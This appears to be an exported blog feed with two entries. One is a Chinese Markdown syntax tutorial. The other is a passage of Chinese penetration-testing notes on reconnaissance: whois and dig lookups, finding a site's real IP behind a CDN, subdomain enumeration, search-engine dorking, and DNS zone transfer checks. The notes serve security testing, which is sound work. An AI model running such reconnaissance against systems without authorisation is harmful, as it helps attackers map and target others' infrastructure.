<tr>
<th>Markdown语法</th>
<th>HTML</th>
<th>预览效果</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>At the command prompt, type `nano`.</code></td>
<td><code>At the command prompt, type &lt;code&gt;nano&lt;/code&gt;.</code></td>
<td>At the command prompt, type <code>nano</code>.</td>
</tr>
</tbody>
</table>
<h2 id="转义反引号"><a href="#转义反引号" class="headerlink" title="转义反引号"></a>转义反引号</h2><p>如果你要表示为代码的单词或短语中包含一个或多个反引号，则可以通过将单词或短语包裹在双反引号(<code>`</code> `)中。</p>
<table>
<thead>
<tr>
<th>Markdown语法</th>
<th>HTML</th>
<th>预览效果</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>``Use `code` in your Markdown file.``</code></td>
<td><code>&lt;code&gt;Use `code` in your Markdown file.&lt;/code&gt;</code></td>
<td><code>Use `code` in your Markdown file.</code></td>
</tr>
</tbody>
</table>
<h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>要创建代码块，请将代码块的每一行缩进至少四个空格或一个制表符。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;lt;html&gt;</span><br><span class="line">  &amp;lt;head&gt;</span><br><span class="line">  &amp;lt;/head&gt;</span><br><span class="line">&amp;lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>渲染效果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;lt;html&gt;</span><br><span class="line">  &amp;lt;head&gt;</span><br><span class="line">  &amp;lt;/head&gt;</span><br><span class="line">&amp;lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><strong>Note:</strong> 要创建不用缩进的代码块，请使用 围栏式代码块（fenced code blocks）.</p>
<span id="more"></span>
<h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><p>要创建分隔线，请在单独一行上使用三个或多个星号 (<code>***</code>)、破折号 (<code>---</code>) 或下划线 (<code>___</code>) ，并且不能包含其他内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">***</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">_________________</span><br></pre></td></tr></table></figure>
<p>以上三个分隔线的渲染效果看起来都一样：</p>
<hr>
<h2 id="分隔线（Horizontal-Rule）用法"><a href="#分隔线（Horizontal-Rule）用法" class="headerlink" title="分隔线（Horizontal Rule）用法"></a>分隔线（Horizontal Rule）用法</h2><p>为了兼容性，请在分隔线的前后均添加空白行。</p>
<table>
<thead>
<tr>
<th>✅  Do this</th>
<th>❌  Don’t do this</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Try to put a blank line before...      ---      ...and after a horizontal rule.</code></td>
<td><code>Without blank lines, this would be a heading.   ---   Don&#39;t do this!</code></td>
</tr>
</tbody>
</table>
<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>链接文本放在中括号内，链接地址放在后面的括号中，链接title可选。</p>
<p>超链接Markdown语法代码：<code>[超链接显示名](超链接地址 &quot;超链接title&quot;)</code></p>
<p>对应的HTML代码：<code>&lt;a href=&quot;超链接地址&quot; title=&quot;超链接title&quot;&gt;超链接显示名&lt;/a&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是一个链接 [Markdown语法](https://maximusarthur.github.io)。</span><br></pre></td></tr></table></figure>
<p>渲染效果如下：</p>
<p>这是一个链接 <a href="https://maximusarthur.github.io">Markdown语法 (opens new window)</a>。</p>
<h2 id="给链接增加-Title"><a href="#给链接增加-Title" class="headerlink" title="给链接增加 Title"></a>给链接增加 Title</h2><p>链接title是当鼠标悬停在链接上时会出现的文字，这个title是可选的，它放在圆括号中链接地址后面，跟链接地址之间以空格分隔。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是一个链接 [Markdown语法](https://maximusarthur.github.io &quot;最好的markdown教程&quot;)。</span><br></pre></td></tr></table></figure>
<p>渲染效果如下：</p>
<p>这是一个链接 <a href="https://maximusarthur.github.io">Markdown语法 (opens new window)</a>。</p>
<h2 id="网址和Email地址"><a href="#网址和Email地址" class="headerlink" title="网址和Email地址"></a>网址和Email地址</h2><p>使用尖括号可以很方便地把URL或者email地址变成可点击的链接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;https://maximusarthur.github.io&gt;</span><br><span class="line">&lt;fake@example.com&gt;</span><br></pre></td></tr></table></figure>
<p>渲染效果如下：</p>
<p><a href="https://maximusarthur.github.io">https://maximusarthur.github.io(opens new window)</a><br><a href="mailto:fake@example.com">fake@example.com</a></p>
<h2 id="带格式化的链接"><a href="#带格式化的链接" class="headerlink" title="带格式化的链接"></a>带格式化的链接</h2><p><a href="https://maximusarthur.github.io">强调</a> 链接, 在链接语法前后增加星号。 要将链接表示为代码，请在方括号中添加反引号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I love supporting the **[EFF](https://eff.org)**.</span><br><span class="line">This is the *[Markdown Guide](https://www.markdownguide.org)*.</span><br><span class="line">See the section on [`code`](#code).</span><br></pre></td></tr></table></figure>
<p>渲染效果如下：</p>
<p>I love supporting the <strong><a href="https://eff.org/">EFF (opens new window)</a></strong>.<br>This is the <em><a href="https://www.markdownguide.org/">Markdown Guide (opens new window)</a></em>.<br>See the section on <a href=""><code>code</code></a>.</p>
<h2 id="引用类型链接"><a href="#引用类型链接" class="headerlink" title="引用类型链接"></a>引用类型链接</h2><p>引用样式链接是一种特殊的链接，它使URL在Markdown中更易于显示和阅读。参考样式链接分为两部分：与文本保持内联的部分以及存储在文件中其他位置的部分，以使文本易于阅读。</p>
<h2 id="链接的第一部分格式"><a href="#链接的第一部分格式" class="headerlink" title="链接的第一部分格式"></a>链接的第一部分格式</h2><p>引用类型的链接的第一部分使用两组括号进行格式设置。第一组方括号包围应显示为链接的文本。第二组括号显示了一个标签，该标签用于指向您存储在文档其他位置的链接。</p>
<p>尽管不是必需的，可以在第一组和第二组括号之间包含一个空格。第二组括号中的标签不区分大小写，可以包含字母，数字，空格或标点符号。</p>
<p>以下示例格式对于链接的第一部分效果相同：</p>
<ul>
<li><code>[hobbit-hole][1]</code></li>
<li><code>[hobbit-hole] [1]</code></li>
</ul>
<h2 id="链接的第二部分格式"><a href="#链接的第二部分格式" class="headerlink" title="链接的第二部分格式"></a>链接的第二部分格式</h2><p>引用类型链接的第二部分使用以下属性设置格式：</p>
<ol>
<li>放在括号中的标签，其后紧跟一个冒号和至少一个空格（例如<code>[label]:</code>）。</li>
<li>链接的URL，可以选择将其括在尖括号中。</li>
<li>链接的可选标题，可以将其括在双引号，单引号或括号中。</li>
</ol>
<p>以下示例格式对于链接的第二部分效果相同：</p>
<ul>
<li><code>[1]: https://en.wikipedia.org/wiki/Hobbit#Lifestyle</code></li>
<li><code>[1]: https://en.wikipedia.org/wiki/Hobbit#Lifestyle &quot;Hobbit lifestyles&quot;</code></li>
<li><code>[1]: https://en.wikipedia.org/wiki/Hobbit#Lifestyle &#39;Hobbit lifestyles&#39;</code></li>
<li><code>[1]: https://en.wikipedia.org/wiki/Hobbit#Lifestyle (Hobbit lifestyles)</code></li>
<li><code>[1]: &lt;https://en.wikipedia.org/wiki/Hobbit#Lifestyle&gt; &quot;Hobbit lifestyles&quot;</code></li>
<li><code>[1]: &lt;https://en.wikipedia.org/wiki/Hobbit#Lifestyle&gt; &#39;Hobbit lifestyles&#39;</code></li>
<li><code>[1]: &lt;https://en.wikipedia.org/wiki/Hobbit#Lifestyle&gt; (Hobbit lifestyles)</code></li>
</ul>
<p>可以将链接的第二部分放在Markdown文档中的任何位置。有些人将它们放在出现的段落之后，有些人则将它们放在文档的末尾（例如尾注或脚注）。</p>
<h2 id="链接最佳实践"><a href="#链接最佳实践" class="headerlink" title="链接最佳实践"></a>链接最佳实践</h2><p>不同的 Markdown 应用程序处理URL中间的空格方式不一样。为了兼容性，请尽量使用%20代替空格。</p>
<table>
<thead>
<tr>
<th>✅  Do this</th>
<th>❌  Don’t do this</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>[link](https://www.example.com/my%20great%20page)</code></td>
<td><code>[link](https://www.example.com/my great page)</code></td>
</tr>
</tbody>
</table>
<h1 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h1><p>通过将文本设置为粗体或斜体来强调其重要性。</p>
<h2 id="粗体（Bold）"><a href="#粗体（Bold）" class="headerlink" title="粗体（Bold）"></a>粗体（Bold）</h2><p>要加粗文本，请在单词或短语的前后各添加两个星号（asterisks）或下划线（underscores）。如需加粗一个单词或短语的中间部分用以表示强调的话，请在要加粗部分的两侧各添加两个星号（asterisks）。</p>
<table>
<thead>
<tr>
<th>Markdown语法</th>
<th>HTML</th>
<th>预览效果</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>I just love **bold text**.</code></td>
<td><code>I just love &lt;strong&gt;bold text&lt;/strong&gt;.</code></td>
<td>I just love <strong>bold text</strong>.</td>
</tr>
<tr>
<td><code>I just love __bold text__.</code></td>
<td><code>I just love &lt;strong&gt;bold text&lt;/strong&gt;.</code></td>
<td>I just love <strong>bold text</strong>.</td>
</tr>
<tr>
<td><code>Love**is**bold</code></td>
<td><code>Love&lt;strong&gt;is&lt;/strong&gt;bold</code></td>
<td>Love<strong>is</strong>bold</td>
</tr>
</tbody>
</table>
<h2 id="粗体（Bold）用法最佳实践"><a href="#粗体（Bold）用法最佳实践" class="headerlink" title="粗体（Bold）用法最佳实践"></a>粗体（Bold）用法最佳实践</h2><p>Markdown 应用程序在如何处理单词或短语中间的下划线上并不一致。为兼容考虑，在单词或短语中间部分加粗的话，请使用星号（asterisks）。</p>
<table>
<thead>
<tr>
<th>✅  Do this</th>
<th>❌  Don’t do this</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Love**is**bold</code></td>
<td><code>Love__is__bold</code></td>
</tr>
</tbody>
</table>
<h2 id="斜体（Italic）"><a href="#斜体（Italic）" class="headerlink" title="斜体（Italic）"></a>斜体（Italic）</h2><p>要用斜体显示文本，请在单词或短语前后添加一个星号（asterisk）或下划线（underscore）。要斜体突出单词的中间部分，请在字母前后各添加一个星号，中间不要带空格。</p>
<table>
<thead>
<tr>
<th>Markdown语法</th>
<th>HTML</th>
<th>预览效果</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Italicized text is the *cat&#39;s meow*.</code></td>
<td><code>Italicized text is the &lt;em&gt;cat&#39;s meow&lt;/em&gt;.</code></td>
<td>Italicized text is the <em>cat’s meow</em>.</td>
</tr>
<tr>
<td><code>Italicized text is the _cat&#39;s meow_.</code></td>
<td><code>Italicized text is the &lt;em&gt;cat&#39;s meow&lt;/em&gt;.</code></td>
<td>Italicized text is the <em>cat’s meow</em>.</td>
</tr>
<tr>
<td><code>A*cat*meow</code></td>
<td><code>A&lt;em&gt;cat&lt;/em&gt;meow</code></td>
<td>A_cat_meow</td>
</tr>
</tbody>
</table>
<h2 id="斜体（Italic）用法的最佳实践"><a href="#斜体（Italic）用法的最佳实践" class="headerlink" title="斜体（Italic）用法的最佳实践"></a>斜体（Italic）用法的最佳实践</h2><p>要同时用粗体和斜体突出显示文本，请在单词或短语的前后各添加三个星号或下划线。要加粗并用斜体显示单词或短语的中间部分，请在要突出显示的部分前后各添加三个星号，中间不要带空格。</p>
<table>
<thead>
<tr>
<th>✅  Do this</th>
<th>❌  Don’t do this</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>A*cat*meow</code></td>
<td><code>A_cat_meow</code></td>
</tr>
</tbody>
</table>
<h2 id="粗体（Bold）和斜体（Italic）"><a href="#粗体（Bold）和斜体（Italic）" class="headerlink" title="粗体（Bold）和斜体（Italic）"></a>粗体（Bold）和斜体（Italic）</h2><p>要同时用粗体和斜体突出显示文本，请在单词或短语的前后各添加三个星号或下划线。要加粗并用斜体显示单词或短语的中间部分，请在要突出显示的部分前后各添加三个星号，中间不要带空格。</p>
<table>
<thead>
<tr>
<th>Markdown语法</th>
<th>HTML</th>
<th>预览效果</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>This text is ***really important***.</code></td>
<td><code>This text is &lt;strong&gt;&lt;em&gt;really important&lt;/em&gt;&lt;/strong&gt;.</code></td>
<td>This text is <strong><em>really important</em></strong>.</td>
</tr>
<tr>
<td><code>This text is ___really important___.</code></td>
<td><code>This text is &lt;strong&gt;&lt;em&gt;really important&lt;/em&gt;&lt;/strong&gt;.</code></td>
<td>This text is <strong><em>really important</em></strong>.</td>
</tr>
<tr>
<td><code>This text is __*really important*__.</code></td>
<td><code>This text is &lt;strong&gt;&lt;em&gt;really important&lt;/em&gt;&lt;/strong&gt;.</code></td>
<td>This text is <strong><em>really important</em></strong>.</td>
</tr>
<tr>
<td><code>This text is **_really important_**.</code></td>
<td><code>This text is &lt;strong&gt;&lt;em&gt;really important&lt;/em&gt;&lt;/strong&gt;.</code></td>
<td>This text is <strong><em>really important</em></strong>.</td>
</tr>
<tr>
<td><code>This is really***very***important text.</code></td>
<td><code>This is really&lt;strong&gt;&lt;em&gt;very&lt;/em&gt;&lt;/strong&gt;important text.</code></td>
<td>This is really<strong><em>very</em></strong>important text.</td>
</tr>
</tbody>
</table>
<h2 id="粗体（Bold）和斜体（Italic）用法的最佳实践"><a href="#粗体（Bold）和斜体（Italic）用法的最佳实践" class="headerlink" title="粗体（Bold）和斜体（Italic）用法的最佳实践"></a>粗体（Bold）和斜体（Italic）用法的最佳实践</h2><p>Markdown 应用程序在处理单词或短语中间添加的下划线上并不一致。为了实现兼容性，请使用星号将单词或短语的中间部分加粗并以斜体显示，以示重要。</p>
<table>
<thead>
<tr>
<th>✅  Do this</th>
<th>❌  Don’t do this</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>This is really***very***important text.</code></td>
<td><code>This is really___very___important text.</code></td>
</tr>
</tbody>
</table>
<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>要创建块引用，请在段落前添加一个 <code>&gt;</code> 符号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; Dorothy followed her through many of the beautiful rooms in her castle.</span><br></pre></td></tr></table></figure>
<p>渲染效果如下所示：</p>
<blockquote>
<p>Dorothy followed her through many of the beautiful rooms in her castle.</p>
</blockquote>
<h2 id="多个段落的块引用"><a href="#多个段落的块引用" class="headerlink" title="多个段落的块引用"></a>多个段落的块引用</h2><p>块引用可以包含多个段落。为段落之间的空白行添加一个 <code>&gt;</code> 符号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; Dorothy followed her through many of the beautiful rooms in her castle.</span><br><span class="line">&gt;</span><br><span class="line">&gt; The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</span><br></pre></td></tr></table></figure>
<p>渲染效果如下：</p>
<blockquote>
<p>Dorothy followed her through many of the beautiful rooms in her castle.</p>
<p>The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</p>
</blockquote>
<h2 id="嵌套块引用"><a href="#嵌套块引用" class="headerlink" title="嵌套块引用"></a>嵌套块引用</h2><p>块引用可以嵌套。在要嵌套的段落前添加一个 <code>&gt;&gt;</code> 符号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; Dorothy followed her through many of the beautiful rooms in her castle.</span><br><span class="line">&gt;</span><br><span class="line">&gt;&gt; The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</span><br></pre></td></tr></table></figure>
<p>渲染效果如下：</p>
<blockquote>
<p>Dorothy followed her through many of the beautiful rooms in her castle.</p>
<blockquote>
<p>The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</p>
</blockquote>
</blockquote>
<h2 id="带有其它元素的块引用"><a href="#带有其它元素的块引用" class="headerlink" title="带有其它元素的块引用"></a>带有其它元素的块引用</h2><p>块引用可以包含其他 Markdown 格式的元素。并非所有元素都可以使用，你需要进行实验以查看哪些元素有效。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; \#### The quarterly results look great!</span><br><span class="line">&gt;</span><br><span class="line">&gt; - Revenue was off the chart.</span><br><span class="line">&gt; - Profits were higher than ever.</span><br><span class="line">&gt;</span><br><span class="line">&gt;  *Everything* is going according to **plan**.</span><br></pre></td></tr></table></figure>
<p>渲染效果如下：</p>
<blockquote>
<p>#### The quarterly results look great!</p>
<ul>
<li>Revenue was off the chart.</li>
<li>Profits were higher than ever.</li>
</ul>
<p><em>Everything</em> is going according to <strong>plan</strong>.</p>
</blockquote>
<h1 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h1><p>要显示原本用于格式化 Markdown 文档的字符，请在字符前面添加反斜杠字符 \ 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\* Without the backslash, this would be a bullet in an unordered list.</span><br></pre></td></tr></table></figure>
<p>渲染效果如下：</p>
<p>* Without the backslash, this would be a bullet in an unordered list.</p>
<h2 id="可做转义的字符"><a href="#可做转义的字符" class="headerlink" title="可做转义的字符"></a>可做转义的字符</h2><p>以下列出的字符都可以通过使用反斜杠字符从而达到转义目的。</p>
<table>
<thead>
<tr>
<th>Character</th>
<th>Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>\</td>
<td>backslash</td>
<td></td>
</tr>
<tr>
<td>`</td>
<td>backtick (see also escaping backticks in code)</td>
</tr>
<tr>
<td>*</td>
<td>asterisk</td>
</tr>
<tr>
<td>_</td>
<td>underscore</td>
</tr>
<tr>
<td>{ }</td>
<td>curly braces</td>
</tr>
<tr>
<td>[ ]</td>
<td>brackets</td>
</tr>
<tr>
<td>( )</td>
<td>parentheses</td>
</tr>
<tr>
<td>#</td>
<td>pound sign</td>
</tr>
<tr>
<td>+</td>
<td>plus sign</td>
</tr>
<tr>
<td>-</td>
<td>minus sign (hyphen)</td>
</tr>
<tr>
<td>.</td>
<td>dot</td>
</tr>
<tr>
<td>!</td>
<td>exclamation mark</td>
</tr>
<tr>
<td>\</td>
<td></td>
<td>pipe (see also escaping pipe in tables)</td>
</tr>
</tbody>
</table>
<h2 id="特殊字符自动转义"><a href="#特殊字符自动转义" class="headerlink" title="特殊字符自动转义"></a>特殊字符自动转义</h2><p>在 HTML 文件中，有两个字符需要特殊处理： <code>&lt;</code> 和 <code>&amp;</code> 。 <code>&lt;</code> 符号用于起始标签，<code>&amp;</code> 符号则用于标记 HTML 实体，如果你只是想要使用这些符号，你必须要使用实体的形式，像是 <code>&amp;lt;</code> 和 <code>&amp;amp;</code>。</p>
<p><code>&amp;</code> 符号其实很容易让写作网页文件的人感到困扰，如果你要打「AT&amp;T」 ，你必须要写成「<code>AT&amp;amp;T</code>」 ，还得转换网址内的 <code>&amp;</code> 符号，如果你要链接到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://images.google.com/images?num=30&amp;q=larry+bird</span><br></pre></td></tr></table></figure>
<p>你必须要把网址转成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://images.google.com/images?num=30&amp;amp;q=larry+bird</span><br></pre></td></tr></table></figure>
<p>才能放到链接标签的 <code>href</code> 属性里。不用说也知道这很容易忘记，这也可能是 HTML 标准检查所检查到的错误中，数量最多的。</p>
<p>Markdown 允许你直接使用这些符号，它帮你自动转义字符。如果你使用 <code>&amp;</code> 符号的作为 HTML 实体的一部分，那么它不会被转换，而在其它情况下，它则会被转换成 <code>&amp;amp;</code>。所以你如果要在文件中插入一个著作权的符号，你可以这样写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;copy;</span><br></pre></td></tr></table></figure>
<p>Markdown 将不会对这段文字做修改，但是如果你这样写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AT&amp;T</span><br></pre></td></tr></table></figure>
<p>Markdown 就会将它转为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AT&amp;amp;T</span><br></pre></td></tr></table></figure>
<p>类似的状况也会发生在 <code>&lt;</code> 符号上，因为 Markdown 支持 <a href="https://markdown.com.cn/basic-syntax/#%E5%86%85%E8%81%94-html">行内 HTML</a> ，如果你使用 <code>&lt;</code> 符号作为 HTML 标签的分隔符，那 Markdown 也不会对它做任何转换，但是如果你是写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4 &lt; 5</span><br></pre></td></tr></table></figure>
<p>Markdown 将会把它转换为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4 &amp;lt; 5</span><br></pre></td></tr></table></figure>
<p>需要特别注意的是，在 Markdown 的块级元素和内联元素中， <code>&lt;</code> 和 <code>&amp;</code> 两个符号都会被自动转换成 HTML 实体，这项特性让你可以很容易地用 Markdown 写 HTML。（在 HTML 语法中，你要手动把所有的 <code>&lt;</code> 和 <code>&amp;</code> 都转换为 HTML 实体。）</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试归纳总结</title>
    <url>/2025/01/26/PenetrationTesting/</url>
    <content><![CDATA[<p><a href="https://owasp.org/www-project-top-ten/">OWASP Top Ten | OWASP Foundation</a></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>从旁观者的角度了解整个WEB应用乃至整个目标的全貌，但是资产是收集不完的，可以边收集，边进行一定程度的测试。信息收集最小的粒度应是<strong>目录</strong>。</p>
<h2 id="目标确认"><a href="#目标确认" class="headerlink" title="目标确认"></a>目标确认</h2><h3 id="1-域名注册信息"><a href="#1-域名注册信息" class="headerlink" title="1. 域名注册信息"></a>1. <strong>域名注册信息</strong></h3><p><strong>通过如下步骤确认目标所有者信息：</strong><br>Whois 目标域名/主机名：whois <a href="http://example.com">http://example.com</a><br>解析目标域名/主机名的IP地址：dig +short <a href="http://example.com">http://example.com</a><br>获取域名的详细解析过程：dig +trace <a href="http://example.com">http://example.com</a><br>后续用于字典制作和进一步收集目标信息的基础</p>
<span id="more"></span>
<h3 id="2-获取真实IP："><a href="#2-获取真实IP：" class="headerlink" title="2. 获取真实IP："></a>2. <strong>获取真实IP：</strong></h3><p>浏览器切换手机模式，可能是真实ip，公众号、小程序中的资产也可能对应真实ip。</p>
<h3 id="3-验证是否存在CDN"><a href="#3-验证是否存在CDN" class="headerlink" title="3. 验证是否存在CDN"></a>3. <strong>验证是否存在CDN</strong></h3><p>方法1：使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p>
<p>方法2：试用nslookup进行检测，如果返回域名解析对应多个IP，那么多半是试用了CDN.<br>nslookup <a href="http://example.com">http://example.com</a></p>
<p>方法3:  在线工具查看是否存在CDN，可以参考以下站点:<br><a href="http://www.cdnplanet.com/tools/cdnfinder">http://www.cdnplanet.com/tools/cdnfinder</a><br><a href="http://www.ipip.net/ip.html">http://www.ipip.net/ip.html</a></p>
<h3 id="4-绕过CDN查找网站真实IP"><a href="#4-绕过CDN查找网站真实IP" class="headerlink" title="4. 绕过CDN查找网站真实IP"></a>4. <strong>绕过CDN查找网站真实IP</strong></h3><ol>
<li><strong>查询历史DNS记录(ip的历史解析域名，域名的历史解析ip)</strong><br>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br><a href="https://censys.io/ipv4?q=baidu.com">https://censys.io/ipv4?q=baidu.com</a></li>
</ol>
<p>非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。<br><a href="http://viewdns.info">http://viewdns.info</a></p>
<p>同样是个令站长十分蛋疼的DNS历史记录网站，记录了几年内的更改记录。<br><a href="http://securitytrails.com">http://securitytrails.com</a><br><a href="https://site.ip138.com/">https://site.ip138.com/</a></p>
<p>庞大的DNS历史数据库，可以查出几年内网站用过的IP、机房信息等。<br><a href="http://iphostinfo.com">http://iphostinfo.com</a><br>注意：这个网站可以遍历FTP、MX记录和常见二级域名，有些站长喜欢把邮箱服务也放在自己主机上，侧面泄露了真实的IP地址，通过这个网站可以进行检查。</p>
<ol start="2">
<li><strong>查询子域名</strong>（捷径，去众测平台、github找官方发布过的）<br>注意：有可能有些站长只给主站或流量大的子域名做了CDN,而很多子域名都是和主站在同一台服务器上，或者 C段中，这样可以通过子域名来辅助找到网站真实IP<br>爆破子域名:</li>
</ol>
<ul>
<li><p><strong>主动式</strong><br>layer子域名挖掘机（字典要自己丰富）<br><a href="http://z.zcjun.com/(在线子域名挖掘)">http://z.zcjun.com/(在线子域名挖掘)</a><br>fuzzdomain 很好用，速度快</p>
</li>
<li><p><strong>被动式</strong><br>搜索引擎拿子域名、旁站（同IP网站）、C段：<br>可用搜索引擎语法查询子域名：<br>谷歌、百度、bing、搜狗(搜索微信文章)、雅虎等略有差异<br>详细用法:<br>（1）site: =主域名,搜索其主要域名下面的子域名<br>（2）allintext: = 搜索文本,但不包括网页标题和链接<br>（3）allinlinks: = 搜索链接, 不包括文本和标题。<br>（4）related:URL = 列出于目标URL地址有关的网页。<br>（5）link:URL = 列出到链接到目标URL的网页清单。<br>（6）使用“-”去掉不想看的结果，例如site:<a href="http://baidu.com">http://baidu.com</a> <a href="http://-image.baidu.com">http://-image.baidu.com</a><br>百度语法： <a href="https://www.cnblogs.com/k0xx/p/12794452.html">https://www.cnblogs.com/k0xx/p/12794452.html</a><br>谷歌语法： <a href="https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187">https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187</a><br>GHDB： <a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
</li>
</ul>
<ol start="3">
<li><strong>资产搜索(旁站\C段\特征):</strong><br><a href="https://www.shodan.io(资产相关或特征值关键字爆ip)">https://www.shodan.io(资产相关或特征值关键字爆ip)</a><br><a href="https://fofa.so">https://fofa.so</a><br><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a> （云悉在线资产平台)<br><a href="http://subdomain.chaxun.la">http://subdomain.chaxun.la</a> （查询啦）<br><a href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a><br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><a href="https://duckduckgo.com">https://duckduckgo.com</a> （一个不会存储你个人信息的搜索引擎）<br><a href="https://crt.sh/（SSL证书查询）">https://crt.sh/（SSL证书查询）</a><br><a href="https://icp.aizhan.com/(域名备案)">https://icp.aizhan.com/(域名备案)</a><br><strong>4.对方服务器给自己发邮件暴露IP</strong></li>
</ol>
<p><strong>5.APP客户端爆ip</strong></p>
<h3 id="5-DNS信息查询"><a href="#5-DNS信息查询" class="headerlink" title="5. DNS信息查询"></a>5. <strong>DNS信息查询</strong></h3><p><strong>目的:</strong>  注册者名称及邮箱,再反查其他域名、手机号、座机号、ASN号<br>地址在线DNS信息查询工具<br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><a href="https://www.dnsdb.io">https://www.dnsdb.io</a> （DNS搜索引擎）<br><a href="http://searchdns.netcraft.com">http://searchdns.netcraft.com</a><br><a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a><br><a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br><a href="https://whois.west.cn/">https://whois.west.cn/</a><br><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a> (站长之家)<br><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a> （天眼查）<br><a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a> （国家企业信用信息系统）<br><a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a> （ICP备案查询）</p>
<h3 id="6-测试域传送漏洞"><a href="#6-测试域传送漏洞" class="headerlink" title="6. 测试域传送漏洞"></a>6. <strong>测试域传送漏洞</strong></h3><p>域传送是一种DNS事务，用于在主从服务器间复制DNS记录。虽然如今已经很少见主机会开启，但是还是应该确认一下。一旦存在域传送漏洞，就意味着你获取了整个域下面所有的记录。<br>dnsrecon -d <a href="http://example.com">http://example.com</a><br>dnsenum <a href="http://example.com">http://example.com</a> 包含自动检测域传送漏洞<br>dnsenum还能爆破子域名，功能比较多，详见：<br><a href="https://blog.csdn.net/weixin_43263851/article/details/108955964">https://blog.csdn.net/weixin_43263851/article/details/108955964</a></p>
